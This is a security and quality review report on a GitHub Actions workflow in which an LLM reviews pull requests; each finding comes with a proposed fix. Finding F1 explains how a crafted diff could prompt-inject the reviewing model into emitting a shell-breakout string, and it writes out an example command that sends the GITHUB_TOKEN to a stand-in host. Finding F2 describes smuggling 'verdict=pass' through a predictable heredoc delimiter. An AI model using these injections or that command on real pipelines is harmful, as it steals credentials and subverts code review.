## Findings

### F1 — Untrusted LLM summary text interpolated via `${{ }}` into a bash script (injection)

- **Severity**: ❌ CRITICAL
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Safety & Quality
- **Location**: `.github/actions/review-agent/action.yml:137`
- **Detail**: `summary="${{ steps.run-agent.outputs.summary }}"` in the "Post PR comment" step substitutes the LLM's `review.summary` field directly into the YAML-templated bash source *before* bash ever parses it — GitHub Actions expression rendering is a textual substitution, not a shell-quoted argument, so bash quoting provides no protection at this line. `summary` is a free-form `z.string()` (`review-schema.ts:41`) generated by the LLM from a diff the PR author fully controls. A diff crafted to prompt-inject the model into emitting a string containing `"` followed by shell metacharacters (e.g. `` "; curl evil/x -d "$GH_TOKEN"; echo " ``) breaks out of the quoted assignment and executes arbitrary shell in a job that holds a `pull-requests: write` `GITHUB_TOKEN` via `pull_request_target`. Verified by hand: `verdict` is safe (zod-enum-constrained to exactly `"pass"`/`"fail"` by `ReviewResult.parse` in `review.ts`, so schema validation already rejects anything else before this step runs), and `sha`/`total_score` are structurally safe (hex SHA, integer) — `summary` is the one genuinely attacker-shaped string reaching a `${{ }}` sink.
- **Fix**: Pass `summary` (and, for consistency, `verdict`/`total-score`) via the step's `env:` block instead of inline `${{ }}`, and reference them as `"$SUMMARY"` etc. inside the bash body. Environment variables set via `env:` are passed through the process environment, not textually substituted into the script, which closes this class of injection entirely. This is the standard GitHub-documented mitigation for untrusted-input-in-`run:`.
- **Decision**: PENDING

### F2 — Fixed, publicly-visible GITHUB_OUTPUT heredoc delimiter combined with LLM-controlled content

- **Severity**: ⚠️ WARNING
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Safety & Quality
- **Location**: `.github/actions/review-agent/action.yml:99-101, 119-123`
- **Detail**: The multi-line `GITHUB_OUTPUT` heredoc pattern uses a fixed delimiter (`REVIEW_AGENT_SUMMARY_EOF_9f3a1c`) baked into public source and visible to anyone reading the repo. `$summary`'s content is diff-shaped LLM output (same attacker-influenceable field as F1, though this specific step uses safe bash-variable expansion, not a `${{ }}` sink). If a crafted diff prompt-injects the model into emitting that exact delimiter string as part of its summary, the `GITHUB_OUTPUT` parser would terminate the multi-line value early, letting subsequent "lines" in the summary be interpreted as new `key=value` output declarations — e.g. smuggling in `verdict=pass` to flip a fail verdict downstream in the same step's own later `echo "verdict=$verdict"` (order-dependent, but the primitive is real and GitHub's own docs warn against predictable delimiters for exactly this reason).
- **Fix**: Generate the delimiter at runtime (e.g. `delim="ghadelim_$(openssl rand -hex 8)"`) instead of a fixed string, in both `run-agent` heredoc sites.
- **Decision**: PENDING

### F3 — `trigger-review` marker search isn't scoped to the bot's own comments

- **Severity**: ⚠️ WARNING
- **Impact**: 🔎 MEDIUM — real tradeoff; pause to reason through it
- **Dimension**: Plan Adherence
- **Location**: `.github/actions/review-agent/action.yml:64-65`
- **Detail**: The plan's Critical Implementation Details and change.md both say "search the **bot's** most recent PR comment" for the `reviewed-sha=<sha>` marker. The implementation instead searches every comment on the PR regardless of author (`[.comments[].body] | map(select(test(...))) | last`). Any PR participant — including the PR author on their own PR — can post a comment containing a fake `<!-- review-agent: reviewed-sha=<old-sha> --> ` marker. When a maintainer later adds `trigger-review`, that spoofed (older) SHA becomes the diff base instead of the real last-reviewed SHA, silently under-reviewing everything committed in between. This was a conscious simplification made during Phase 2 (noted at the time as "acceptable for a single-maintainer-controlled repo") but is worth a deliberate decision now that fork-PR support (arbitrary external authors) is explicitly in scope.
- **Fix A ⭐ Recommended**: Filter by comment author before matching the marker — `select(.user.login == "github-actions[bot]")` (the default identity when posting via `secrets.GITHUB_TOKEN`) `and (.body | test(...))`.
  - Strength: Closes the spoofing gap with a one-line `jq` filter change; matches the plan's literal "bot's comment" language.
  - Tradeoff: Couples the check to the exact bot login string, which would need updating if the workflow ever switches from `GITHUB_TOKEN` to a custom PAT/GitHub App with a different identity.
  - Confidence: HIGH — `github-actions[bot]` is the well-documented, stable login for comments posted via the default `GITHUB_TOKEN`.
  - Blind spot: Not verified against a live PR (Phase 4 is where that would happen).
- **Fix B**: Leave as-is; accept the spoofing risk as low-severity for now since the worst case is an under-scoped incremental review, not a bypassed `fail` verdict (a spoofed old SHA still requires a real subsequent full review to ever reach `passed`).
  - Strength: No code change; simplest.
  - Tradeoff: Leaves a real (if narrow) integrity gap once fork PRs are actually exercised.
  - Confidence: MEDIUM — the actual exploitability depends on how much the maintainer trusts `trigger-review` results without eyeballing the diff themselves.
  - Blind spot: Haven't modeled how often `trigger-review` is used vs. a fresh PR open (which always does a full diff regardless of this gap).
- **Decision**: PENDING

### F4 — Composite action duplicates checkout + Node setup already done by the calling workflow

- **Severity**: ⚠️ WARNING
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Scope Discipline
- **Location**: `.github/actions/review-agent/action.yml:31-46`, `.github/workflows/review.yml:27-31`
- **Detail**: Phase 2's contract step list didn't include Node setup (its own Automated Verification assumed `npx tsx` availability "via setup-node in parent workflow"), but the composite action was built to self-contain its own checkout + `setup-node` + `npm ci` for reusability. `review.yml` (Phase 3) *also* checks out and runs `setup-node` before invoking the action — the outer checkout is structurally required (`uses: ./local/path` needs the action.yml already on disk to resolve), but the outer `setup-node` does nothing useful since no npm command runs between it and the action's own internal setup, so it's a real (if small) per-run time cost with no corresponding win. This was a disclosed, deliberate choice at the time (noted in both phase commit messages) rather than an oversight, but is worth a final call now that both files exist side by side.
- **Fix**: Drop the `actions/setup-node@v4` step from `review.yml` (keep only `checkout`, which is still required for local-action resolution); the composite action's own internal `setup-node` already covers `npx tsx`.
- **Decision**: PENDING

### F5 — Label operations assume the three labels already exist, with no defensive fallback

- **Severity**: ⚠️ WARNING
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Safety & Quality
- **Location**: `.github/actions/review-agent/action.yml:170-181`
- **Detail**: `gh pr edit --add-label` requires the label to already exist as a repo label; nothing in the workflow creates `review-agent-passed`/`review-agent-failed`/`trigger-review` if the one-time manual setup (plan's Migration Notes) hasn't happened yet. Under `set -euo pipefail`, the very first run before that setup is complete would abort with an opaque `gh` error rather than a clear message pointing at the missing prerequisite. This is already documented as a manual operator step in the plan, so it's not a silent gap, but the failure mode itself isn't self-explanatory from the CI log alone.
- **Fix**: Optional — add `gh label create <name> --color ... --force` (idempotent) ahead of the `gh pr edit` calls, or leave as-is and rely on the documented prerequisite (acceptable given it's a one-time, already-documented setup step).
- **Decision**: PENDING

### F6 — `trigger-review` label removal also satisfies the re-run guard (inherited from the plan's own example)

- **Severity**: 👁️ OBSERVATION
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Plan Adherence
- **Location**: `.github/workflows/review.yml:20-23`
- **Detail**: `github.event.label.name == 'trigger-review'` is true on both the `labeled` and `unlabeled` action types for that label, so when the composite action's own "Manage labels" step removes `trigger-review` after finishing (`action.yml:175/180`), that removal fires an `unlabeled` event whose payload can also satisfy the guard's second clause, alongside the first clause depending on exact event-ordering. In the worst case this could cause one redundant, self-triggered re-run per completed review — not an infinite loop (the redundant run would itself remove `trigger-review` again, a no-op) but wasted API cost. This exact guard expression is copied verbatim from the plan's own "Critical Implementation Details" snippet, so it's an inherited plan-level gap, not implementation drift.
- **Fix**: Not required now; worth a note for Phase 4's live testing to confirm whether this actually fires in practice (GitHub may coalesce the batched label changes into fewer distinct webhook deliveries than the worst case assumes).
- **Decision**: PENDING
